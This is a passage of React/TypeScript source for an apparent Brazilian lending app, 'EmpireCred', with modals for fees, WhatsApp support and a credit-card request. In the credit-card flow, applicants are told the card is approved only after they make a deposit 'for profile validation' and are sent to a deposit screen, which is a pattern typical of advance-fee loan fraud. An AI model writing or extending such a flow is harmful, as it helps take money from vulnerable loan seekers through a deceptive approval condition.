              exit={{ scale: 0.9, opacity: 0 }}
              className="relative w-full max-w-md bg-white rounded-[32px] p-8 space-y-6 overflow-hidden shadow-2xl"
            >
              <div className="flex items-center justify-between">
                <h3 className="text-xl font-bold text-zinc-900">Taxas e impostos</h3>
                <button onClick={() => setActiveMenu(null)} className="text-zinc-400 p-2">
                  <X size={24} />
                </button>
              </div>

              <div className="space-y-4">
                <div className="p-4 bg-emerald-50 rounded-2xl border border-emerald-100">
                  <p className="text-sm text-emerald-800 leading-relaxed">
                    Trabalhamos com total transparência em nossas operações de crédito. Confira abaixo as taxas aplicadas:
                  </p>
                </div>

                <div className="space-y-3">
                  <div className="flex justify-between items-center p-4 bg-zinc-50 rounded-xl border border-zinc-100">
                    <span className="text-xs font-bold text-zinc-500 uppercase tracking-widest">Taxa de Juros</span>
                    <span className="text-sm font-bold text-zinc-900">A partir de 2,89% a.m.</span>
                  </div>
                  <div className="flex justify-between items-center p-4 bg-zinc-50 rounded-xl border border-zinc-100">
                    <span className="text-xs font-bold text-zinc-500 uppercase tracking-widest">IOF</span>
                    <span className="text-sm font-bold text-zinc-900">Conforme legislação</span>
                  </div>
                  <div className="flex justify-between items-center p-4 bg-zinc-50 rounded-xl border border-zinc-100">
                    <span className="text-xs font-bold text-zinc-500 uppercase tracking-widest">Taxa da plataforma</span>
                    <span className="text-sm font-bold text-zinc-900">R$ {(config?.platformFee || 29.90).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
                  </div>
                  <div className="flex justify-between items-center p-4 bg-zinc-50 rounded-xl border border-zinc-100">
                    <span className="text-xs font-bold text-zinc-500 uppercase tracking-widest">CET</span>
                    <span className="text-sm font-bold text-zinc-900">Variável por perfil</span>
                  </div>
                </div>

                <p className="text-[10px] text-zinc-400 leading-relaxed text-center">
                  * O Custo Efetivo Total (CET) e as taxas finais dependem da análise de crédito individual e da modalidade de empréstimo escolhida.
                </p>
              </div>

              <button 
                onClick={() => setActiveMenu(null)}
                className="w-full bg-zinc-900 text-white py-4 rounded-2xl font-bold shadow-xl"
              >
                Entendido
              </button>
            </motion.div>
          </div>
        )}



        {activeMenu === 'help' && (
          <div className="fixed inset-0 z-[100] flex items-end justify-center p-0 sm:p-4 sm:items-center">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setActiveMenu(null)}
              className="absolute inset-0 bg-black/60 backdrop-blur-sm"
            />
            <motion.div 
              initial={{ y: "100%" }}
              animate={{ y: 0 }}
              exit={{ y: "100%" }}
              className="relative w-full max-w-md bg-white rounded-t-[32px] sm:rounded-[32px] p-8 space-y-8 overflow-hidden"
            >
              <div className="flex items-center justify-between">
                <h3 className="text-xl font-bold text-zinc-900">Ajuda e Suporte</h3>
                <button onClick={() => setActiveMenu(null)} className="text-zinc-400 p-2">
                  <X size={24} />
                </button>
              </div>

              <div className="text-center space-y-6">
                <div className="w-20 h-20 bg-emerald-50 rounded-full flex items-center justify-center mx-auto text-[#008542]">
                  <MessageCircle size={40} />
                </div>
                <div className="space-y-2">
                  <h4 className="font-bold text-zinc-900">Suporte via WhatsApp</h4>
                  <p className="text-sm text-zinc-500 leading-relaxed">
                    Nossa equipe está pronta para te ajudar 24 horas por dia. Clique no botão abaixo para iniciar uma conversa.
                  </p>
                </div>
                
                <div className="bg-zinc-50 p-6 rounded-2xl border border-zinc-100 text-left space-y-4">
                  <div className="flex items-center space-x-3">
                    <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
                    <span className="text-xs font-bold text-zinc-600 uppercase tracking-widest">Atendimento Online 24h</span>
                  </div>
                  <p className="text-xs text-zinc-500">Suporte disponível 24 horas por dia, 7 dias por semana.</p>
                </div>

                <button 
                  onClick={() => window.open('https://wa.me/5511957978342', '_blank')}
                  className="w-full bg-[#25D366] text-white py-4 rounded-2xl font-bold shadow-lg flex items-center justify-center space-x-2"
                >
                  <MessageCircle size={20} />
                  <span>Falar com Suporte</span>
                </button>
              </div>
            </motion.div>
          </div>
        )}

        {activeMenu === 'credit_card' && (
          <div className="fixed inset-0 z-[100] flex items-end justify-center p-0 sm:p-4 sm:items-center">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => {
                setActiveMenu(null);
                if (profile.creditCardRequest?.status !== 'pending') {
                  setCcStep('info');
                }
              }}
              className="absolute inset-0 bg-black/60 backdrop-blur-sm"
            />
            <motion.div 
              initial={{ y: "100%" }}
              animate={{ y: 0 }}
              exit={{ y: "100%" }}
              className="relative w-full max-w-md bg-white rounded-t-[32px] sm:rounded-[32px] p-8 space-y-8 overflow-hidden"
            >
              <div className="flex items-center justify-between">
                <h3 className="text-xl font-bold text-zinc-900">Cartão de Crédito</h3>
                <button onClick={() => {
                  setActiveMenu(null);
                  if (profile.creditCardRequest?.status !== 'pending') {
                    setCcStep('info');
                  }
                }} className="text-zinc-400 p-2">
                  <X size={24} />
                </button>
              </div>

              <div className="text-center space-y-6">
                <div className="w-20 h-20 bg-emerald-50 rounded-full flex items-center justify-center mx-auto text-[#008542]">
                  <CreditCard size={40} />
                </div>
                
                <AnimatePresence mode="wait">
                  {ccStep === 'info' && (
                    <motion.div 
                      key="info"
                      initial={{ opacity: 0, x: 20 }}
                      animate={{ opacity: 1, x: 0 }}
                      exit={{ opacity: 0, x: -20 }}
                      className="space-y-6"
                    >
                      <div className="space-y-2">
                        <h4 className="font-bold text-zinc-900 text-lg">Solicite seu Cartão</h4>
                        <p className="text-sm text-zinc-500 leading-relaxed">
                          Tenha mais liberdade financeira com o cartão EmpireCred. Solicite agora um limite de até R$ 1.000,00.
                        </p>
                      </div>
                      <button 
                        onClick={() => setCcStep('amount')}
                        className="w-full bg-zinc-900 text-white py-4 rounded-2xl font-bold shadow-lg"
                      >
                        Solicitar Limite
                      </button>
                    </motion.div>
                  )}

                  {ccStep === 'amount' && (
                    <motion.div 
                      key="amount"
                      initial={{ opacity: 0, x: 20 }}
                      animate={{ opacity: 1, x: 0 }}
                      exit={{ opacity: 0, x: -20 }}
                      className="space-y-6"
                    >
                      <div className="space-y-2">
                        <h4 className="font-bold text-zinc-900 text-lg">Qual limite você deseja?</h4>
                        <p className="text-sm text-zinc-500">Escolha um valor até R$ 1.000,00</p>
                      </div>
                      <div className="relative">
                        <span className="absolute left-4 top-1/2 -translate-y-1/2 font-bold text-zinc-400">R$</span>
                        <input 
                          type="number"
                          value={ccAmount}
                          onChange={(e) => {
                            const val = e.target.value;
                            if (Number(val) <= 1000) setCcAmount(val);
                          }}
                          placeholder="0,00"
                          className="w-full bg-zinc-50 border-none rounded-2xl py-4 pl-12 pr-4 text-lg font-bold focus:ring-2 focus:ring-[#008542] outline-none"
                        />
                      </div>
                      <button 
                        disabled={!ccAmount || Number(ccAmount) <= 0}
                        onClick={handleCCRequest}
                        className="w-full bg-zinc-900 text-white py-4 rounded-2xl font-bold shadow-lg disabled:opacity-50"
                      >
                        Confirmar Solicitação
                      </button>
                    </motion.div>
                  )}

                  {ccStep === 'analyzing' && (
                    <motion.div 
                      key="analyzing"
                      initial={{ opacity: 0, x: 20 }}
                      animate={{ opacity: 1, x: 0 }}
                      exit={{ opacity: 0, x: -20 }}
                      className="space-y-6"
                    >
                      <div className="space-y-2">
                        <h4 className="font-bold text-zinc-900 text-lg">Solicitação em Análise</h4>
                        <p className="text-sm text-zinc-500 leading-relaxed">
                          Sua solicitação de R$ {(Number(ccAmount) || 0).toLocaleString('pt-BR', { minimumFractionDigits: 2 })} está em análise.
                        </p>
                        <div className="p-4 bg-amber-50 border border-amber-100 rounded-2xl">
                          <p className="text-xs text-amber-700 font-medium leading-relaxed">
                            Para que seu cartão seja aprovado, é necessário realizar um depósito em sua conta para validação de perfil.
                          </p>
                        </div>
                      </div>
                      <button 
                        onClick={() => {
                          setActiveMenu('deposit');
                          setDepositStep('amount');
                          if (profile.creditCardRequest?.status !== 'pending') {
                            setCcStep('info');
                          }
                        }}
                        className="w-full bg-zinc-900 text-white py-4 rounded-2xl font-bold shadow-lg flex items-center justify-center space-x-2"
                      >
                        <Plus size={20} />
                        <span>Realizar Depósito</span>
                      </button>
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}

function TransactionItem({ label, value, date }: { label: string, value: string, date: string }) {
  const isNegative = value.startsWith('-');
  return (
    <div className="flex justify-between items-center p-4 bg-zinc-50 rounded-xl border border-zinc-100">
      <div className="space-y-1">
        <p className="text-xs font-bold text-zinc-900">{label}</p>
        <p className="text-[10px] text-zinc-400">{date}</p>
      </div>
      <p className={`font-bold text-sm ${isNegative ? 'text-red-500' : 'text-emerald-600'}`}>{value}</p>
    </div>
  );
}

function QuickAction({ icon, label, onClick, active }: { icon: React.ReactNode, label: string, onClick?: () => void, active?: boolean }) {
  return (
    <motion.button 
      whileHover={{ scale: 1.05 }}
      whileTap={{ scale: 0.95 }}
      onClick={onClick}
      className="flex flex-col items-center space-y-2"
    >
      <div className={`w-14 h-14 rounded-full flex items-center justify-center transition-all bg-[#F0F0F2] ${active ? 'text-zinc-900 shadow-inner' : 'text-zinc-400'}`}>
        {icon}
      </div>
      <span className="text-xs font-medium text-zinc-600">{label}</span>
    </motion.button>
  );
}
